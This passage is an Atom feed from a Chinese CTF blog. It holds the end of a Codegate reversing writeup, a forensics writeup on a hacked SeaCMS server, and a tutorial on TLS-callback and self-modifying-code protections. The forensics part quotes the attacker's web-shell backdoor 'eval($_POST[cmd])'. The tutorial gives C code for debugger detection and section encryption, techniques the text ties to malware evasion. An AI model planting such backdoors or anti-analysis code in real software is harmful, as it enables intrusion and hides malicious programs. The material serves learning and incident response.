class="number">-0xffc2bdec</span>)&amp;<span class="number">0xffffffff</span>)^<span class="number">0xffc2bdec</span></span><br><span class="line">    a = (((c&amp;<span class="number">0xffffffff</span>)<span class="number">-0xffc2bdec</span>)&amp;<span class="number">0xffffffff</span>)^<span class="number">0xffc2bdec</span></span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; <span class="number">32</span>) | b)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0xd274a5ce60ef2dca</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x7f</span>):</span><br><span class="line">    flag = decrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(flag)</span><br><span class="line"><span class="keyword">print</span> hex(flag)[<span class="number">2</span>:<span class="number">-1</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://lordidiot.github.io/2019-01-27/codegate-junior-quals-2019/" target="_blank" rel="noopener">https://lordidiot.github.io/2019-01-27/codegate-junior-quals-2019/</a><br><a href="https://tcode2k16.github.io/blog/posts/2019-01-27-codegate-qualifier-writeup/" target="_blank" rel="noopener">https://tcode2k16.github.io/blog/posts/2019-01-27-codegate-qualifier-writeup/</a><br><a href="https://blog.csdn.net/u010376788/article/details/49764205" target="_blank" rel="noopener">https://blog.csdn.net/u010376788/article/details/49764205</a><br><a href="https://blog.pspaul.de/posts/codegate-pre-2019-pyprot3ct/" target="_blank" rel="noopener">https://blog.pspaul.de/posts/codegate-pre-2019-pyprot3ct/</a><br><a href="https://devel0pment.de/?p=1179" target="_blank" rel="noopener">https://devel0pment.de/?p=1179</a><br><a href="https://ctftime.org/writeup/12955" target="_blank" rel="noopener">https://ctftime.org/writeup/12955</a><br><a href="https://balsn.tw/ctf_writeup/20190126-codegatectf/" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190126-codegatectf/</a><br><a href="https://github.com/leesh3288/CTF/blob/master/2019/CODEGATE/mini%20converter/mini_converter_writeup.md" target="_blank" rel="noopener">https://github.com/leesh3288/CTF/blob/master/2019/CODEGATE/mini%20converter/mini_converter_writeup.md</a><br><a href="https://blog.metamon.xyz/2019/01/31/codegate-2019-qual-writeup/" target="_blank" rel="noopener">https://blog.metamon.xyz/2019/01/31/codegate-2019-qual-writeup/</a><br><a href="https://github.com/pwning/public-writeup/tree/master/codegate2019/pyprot3ct" target="_blank" rel="noopener">https://github.com/pwning/public-writeup/tree/master/codegate2019/pyprot3ct</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;打了一次Codegate真滴太难了。跟着国外大佬的writeup复现还是学到了一点东西。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>2018-安恒杯十二月月赛-writeup</title>
    <link href="https://qianfei11.github.io/2019/01/25/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%912018-%E5%AE%89%E6%81%92%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88%E6%9C%88%E8%B5%9B-writeup/"/>
    <id>https://qianfei11.github.io/2019/01/25/【未完成】2018-安恒杯十二月月赛-writeup/</id>
    <published>2019-01-25T08:12:19.000Z</published>
    <updated>2019-02-01T12:11:22.387Z</updated>
    
    <content type="html"><![CDATA[<p>记录两道pwn题。</p><a id="more"></a><h1 id="messageb0x"><a href="#messageb0x" class="headerlink" title="messageb0x"></a>messageb0x</h1><p>基础的栈溢出。</p><h1 id="smallorange"><a href="#smallorange" class="headerlink" title="smallorange"></a>smallorange</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录两道pwn题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
      <category term="pwn" scheme="https://qianfei11.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2018-信息安全铁人三项赛总决赛-数据赛-writeup</title>
    <link href="https://qianfei11.github.io/2018/12/08/2018-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%95%B0%E6%8D%AE%E8%B5%9B-writeup/"/>
    <id>https://qianfei11.github.io/2018/12/08/2018-信息安全铁人三项赛总决赛-数据赛-writeup/</id>
    <published>2018-12-08T11:44:17.000Z</published>
    <updated>2018-12-09T07:15:18.819Z</updated>
    
    <content type="html"><![CDATA[<p>第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台web服务器溯源。</p><a id="more"></a><h1 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h1><p>第一次接触，全队也就自己一个人在做，挖了坑也填了坑，记录一下。</p><ol><li>服务器给的是命令行界面，不用想着变成图形界面来操作。因为我<code>init 5</code>变成图形界面后发现完全没法操作…后来为了变回去我误以为是<code>init 0</code>，直接把服务器关了…后来只能让让主办方帮忙重启一下，差点被扣分…</li><li>刚开始的时候我主要目标是在每个用户的家目录以及web服务的根目录下查看是否有一些隐藏文件，还是可以收集到一些重要信息的。</li><li>然后在数据库的目录下也可以发现一些信息。</li><li>之后慢慢发现最重要其实是web服务下的一些log文件，记录了黑客对服务器攻击的主要过程。</li><li>后来我还发现在每个用户家目录下的<code>.bash_history</code>也是很有用的，可以看到黑客提权后干的事情。</li><li>查看文件的话，建议用<code>less -mN filename</code>，因为纯命令行的界面不能滚屏，用<code>less</code>就会方便很多。</li><li>刚登上服务器建议<code>lastlog</code>一下，看看除了root用户之外其他用户最后一次是什么时候登陆的。</li><li>其他命令的话，常用<code>grep</code>肯定是没错的…</li></ol><p>然后比赛的时候也找了两篇关于服务器溯源的文章，记录一下：</p><ul><li><a href="https://www.freebuf.com/articles/web/138867.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/138867.html</a></li><li><a href="https://www.freebuf.com/articles/rookie/179638.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/rookie/179638.html</a></li></ul><p>比赛的时候因为我们队排名在后来不是很靠前，然后我信息的收集也不是很到位，第一题怕做错会扣分，万一我们连三等奖都拿不到了，就没敢做。比赛结束后才知道每个队伍都会获奖…</p><h1 id="溯源过程记录"><a href="#溯源过程记录" class="headerlink" title="溯源过程记录"></a>溯源过程记录</h1><p>题目差不多是这样：黑客在内网中拿到了两台肉鸡，然后通过这两台肉鸡对一台服务器进行了攻击，我们则需要对这台服务器溯源取证分析，并且找到黑客留下的后门。</p><p>刚拿到服务器，先在在root的家目录下查看了一下隐藏文件，没想到一下子就有收获：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/1.png" alt="数据库的账号和密码"></p><p>在这里一下子就拿到了数据库的账号和密码。</p><p>然后尝试登陆一下数据库，发现有一个<code>seacms</code>的数据库，然后进去之后发现一些重要的信息：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/2.png" alt="admin和hacker的账号密码和ip"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/3.png" alt="能判断出这是一个海洋cms的站"></p><p>看完数据库，我就去查了一下关于海洋cms的洞：</p><ul><li><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/150042.html</a></li><li><a href="https://www.jianshu.com/p/ebf156afda49" target="_blank" rel="noopener">https://www.jianshu.com/p/ebf156afda49</a></li></ul><p>大概知道了是在web根目录下的<code>search.php</code>中存在漏洞，然后通过分析黑客可能用来攻击的<a href="https://github.com/SparkHex/seacms-getshell-poc" target="_blank" rel="noopener">脚本</a>，大概知道了攻击过程。</p><p>我这里还把<code>search.php</code>记录下来了：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/4.png" alt="search.php第1部分"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/5.png" alt="search.php第2部分"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/6.png" alt="search.php第3部分"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/7.png" alt="search.php第4部分"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/8.png" alt="search.php第5部分"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/9.png" alt="search.php第6部分"></p><p>在web目录下还看到了一个<code>360safe</code>，就截了张图：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/10.png" alt="360safe目录"></p><p>然后我看了一下每个用户家目录下的<code>.bash_history</code>，正常的用户<code>simple</code>以及黑客创建的<code>hacker</code>都没啥，主要是root的<code>.bash_history</code>：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/11.png" alt="关闭了防火墙"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/12.png" alt="装了安全狗"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/13.png" alt="备份了一份passwd"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/14.png" alt="passwd备份文件"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/15.png" alt="被修改过的passwd"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/16.png" alt="一串奇怪的Xshell"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/17.png" alt="删掉了web目录下uploads中某个文件夹中的内容"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/18.png" alt="这里应该是起了海洋cms的服务"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/19.png" alt="切换到hacker用户，然后备份了一个bash改了还权限"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/20.png" alt="一堆对log文件还有其他文件的操作"></p><p>大概收集了这些，也能推断出黑客拿到权限后新建了一个叫hacker的用户，然后黑客的操作是从什么时候开始的也无法判断。再<code>grep</code>一下：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/21.png" alt="和hacker相关的一些操作"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/22.png" alt="发现root查看过一些log文件"></p><p>下一步我就开始看日志，通过对<code>.bash_history</code>的阅读，判断主要是在<code>/var/log/httpd</code>下和<code>/var/www/html/logs</code>下的log文件：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/23.png" alt="主要在access_log中"></p><p>然后就开始对log文件一行一行看下来：</p><p>基本看到几个ip：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/24.png" alt="192.168.12.173"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/25.png" alt="192.168.12.156"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/26.png" alt="192.168.31.119"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/27.png" alt="192.168.12.125"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/28.png" alt="192.168.31.73"></p><p>在后面一点的时候会看到<code>192.168.12.173</code>，通过GET的url很容易判断出在用脚本打网站：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/29.png" alt="看到seacms的poc提权脚本"></p><p>最后看到可以黑客在放后门<code>eval($_POST[cmd])</code>：</p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/30.png" alt="判断是黑客用192.168.31.119登上了admin"></p><p><img src="/pics/2018-信息安全铁人三项赛总决赛-数据赛-writeup/31.png" alt="后门"></p><p>大概的分析就是这样，中间也踩了很多坑。我最后的判断是：</p><table><thead><tr><th style="text-align:center">IP</th><th style="text-align:center">IDENTITY</th><th style="text-align:center">OPERATING SYSTEM</th></tr></thead><tbody><tr><td style="text-align:center">192.168.31.119</td><td style="text-align:center">admin</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.129</td><td style="text-align:center">victim</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.173</td><td style="text-align:center">bot</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.156</td><td style="text-align:center">bot</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.125</td><td style="text-align:center">bot</td><td style="text-align:center">android</td></tr><tr><td style="text-align:center">192.168.31.73</td><td style="text-align:center">bot</td><td style="text-align:center">android</td></tr></tbody></table><p>感觉自己整体分析下来应该方向是没错的，可能因为自己没学过计网，对一些网络的协议和请求方式没有了解很透彻，导致比赛的时候第一题问两台肉鸡的ip就判断错了，然后就没敢做下去…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台web服务器溯源。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护</title>
    <link href="https://qianfei11.github.io/2018/12/08/%E7%BB%95%E8%BF%87TLS%EF%BC%88Thread%20Local%20Storage%EF%BC%89%E5%92%8CSMC%EF%BC%88Self%20Modifying%20Code%EF%BC%89%E4%BF%9D%E6%8A%A4/"/>
    <id>https://qianfei11.github.io/2018/12/08/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/</id>
    <published>2018-12-08T04:37:41.000Z</published>
    <updated>2019-02-03T10:26:10.704Z</updated>
    
    <content type="html"><![CDATA[<p>main函数前有什么？</p><a id="more"></a><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><h2 id="什么是TLS"><a href="#什么是TLS" class="headerlink" title="什么是TLS"></a>什么是TLS</h2><p>TLS（Thread Local Storage）回调函数是每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于EP（Entry Point）代码。功能就是把PE文件的TEXT段进行加密，隐藏他的静态代码段特性，在运行的时候抢在main函数执行之前把代码段直接在内存里面解密（不然就崩溃了），从而达到静态代码隐藏功能。</p><h2 id="编写TLS"><a href="#编写TLS" class="headerlink" title="编写TLS"></a>编写TLS</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="comment">//使用tls 回调函数</span></span><br><span class="line"><span class="comment">//使用TLS 的宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/INCLUDE:__tls_used"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lookupprocess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line">pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>); <span class="comment">// 在快照中包含系统中所有的进程</span></span><br><span class="line">BOOL bMore = Process32First(hProcessSnap, &amp;pe32); <span class="comment">// 获得第一个进程的句柄</span></span><br><span class="line"><span class="keyword">while</span> (bMore) &#123;</span><br><span class="line">_wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ollyice.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////WARNING///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ollydbg.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"peid.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ida.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"idaq.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">bMore = Process32Next(hProcessSnap, &amp;pe32); <span class="comment">// 获取下一个进程的句柄</span></span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hProcessSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Debugger</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax, dword ptr fs:[<span class="number">30</span>h]<span class="comment">//TEB偏移30H处</span></span><br><span class="line">movzx eax, byte ptr ds:[eax + <span class="number">2</span>h]<span class="comment">//取PEB中BeingDebug，若为1则被调试</span></span><br><span class="line">mov result, eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">tls_callback</span><span class="params">(PVOID h, DWORD reason, PVOID pv)</span> </span>&#123;</span><br><span class="line">lookupprocess();</span><br><span class="line">Debugger();</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"Not_Main_this_is_tls!"</span>, <span class="string">L"tls"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">".CRT$XLB"</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"Main!"</span>, <span class="string">L"ESE"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调试TLS"><a href="#调试TLS" class="headerlink" title="调试TLS"></a>调试TLS</h2><p>把有TLS保护的程序拖进ida分析，会看到main函数其实是空的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在start（也就是entry point）处下断点调试：</p><p><img src="/pics/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/1.png" alt="设下断点"></p><p>发现程序依然执行了，说明程序在entry point之前运行了。</p><p><img src="/pics/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/2.png" alt="程序运行"></p><p>同时可以查看entry point list（Ctrl+E），发现ida也已经反编译出了一个叫做<code>TlsCallback_0()</code>的函数：</p><p><img src="/pics/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/3.png" alt="entry point list"></p><p>查看一下该函数的反汇编代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">stdcall <span class="title">TlsCallback_0</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, Text, Caption, <span class="number">0</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也是许多未知程序在逆向时，更建议在虚拟环境下运行的原因。</p><h2 id="手动去除TLS"><a href="#手动去除TLS" class="headerlink" title="手动去除TLS"></a>手动去除TLS</h2><p>TlsCallback函数的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> VOID</span><br><span class="line">(NTAPI *PIMAGE_TLS_CALLBACK) (</span><br><span class="line">    PVOID DllHandle,     <span class="comment">// 模块句柄，即加载地址</span></span><br><span class="line">    DWORD Reason,        </span><br><span class="line">    PVOID Reserved</span><br><span class="line">    );</span><br><span class="line">其中reason有以下几种：(winNT.h)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_ATTACH   1  <span class="comment">// 进程启动</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_ATTACH    2  <span class="comment">// 线程启动</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_DETACH    3  <span class="comment">// 线程退出</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_DETACH   0  <span class="comment">// 进程退出</span></span></span><br></pre></td></tr></table></figure><p>可以参照之前写过的一片writeup：<a href="https://qianfei11.github.io/2018/05/07/2018-ZJGSCTF-writeup/#New-driver">https://qianfei11.github.io/2018/05/07/2018-ZJGSCTF-writeup/#New-driver</a></p><h1 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h1><h2 id="什么是SMC"><a href="#什么是SMC" class="headerlink" title="什么是SMC"></a>什么是SMC</h2><p>SMC（Self Modifying Code）是一种将可执行文件中的代码或数据进行加密，防止别人使用逆向工程工具（比如一些常见的反汇编工具）对程序进行静态分析的方法，只有程序运行时才对代码和数据进行解密，从而正常运行程序和访问数据。计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。现在，很多加密软件（或者称为“壳”程序）为了防止Cracker（破解者）跟踪自己的代码，也采用了动态代码修改技术对自身代码进行保护。要精准的定位某个函数非常麻烦，所以我们就要以区块为加密的基础单位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt_func</span><span class="params">(<span class="keyword">char</span> *start_addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        *(start + i) ^= <span class="number">0x88</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写SMC"><a href="#编写SMC" class="headerlink" title="编写SMC"></a>编写SMC</h2><p>因为定位一个具体的函数很繁琐，所以我们选择直接定位一个节表。把敏感的代码放入节表中，然后在需要的时候进行解密，这就是SMC动态加密技术的精髓。将下面这行代码放在开始程序的开始（也就是include下面），主要是让text节区可以执行、读、写和分享：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/SECTION:.text,ERWS"</span>)</span></span><br></pre></td></tr></table></figure><p>以下代码可以编译生成可执行文件，但是无法运行，因为<code>ck()</code>函数的地址已经被打乱。这时候就利用OD进行修改，载入生成的程序，当程序运行<code>enccrpt_func()</code>函数完成时，<code>ck()</code>就已经完成加密，然后将程序dump下来，这时就可以运行。若拿一开始的程序去静态看，是完全看不懂的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/SECTION:.text,ERWS"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt_func</span><span class="params">(<span class="keyword">char</span> *start_addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123; <span class="comment">//这里对地址进行简单的加密&gt;</span></span><br><span class="line">*(start + i) ^= <span class="number">0x88</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要保护的函数</span></span><br><span class="line"><span class="function"><span 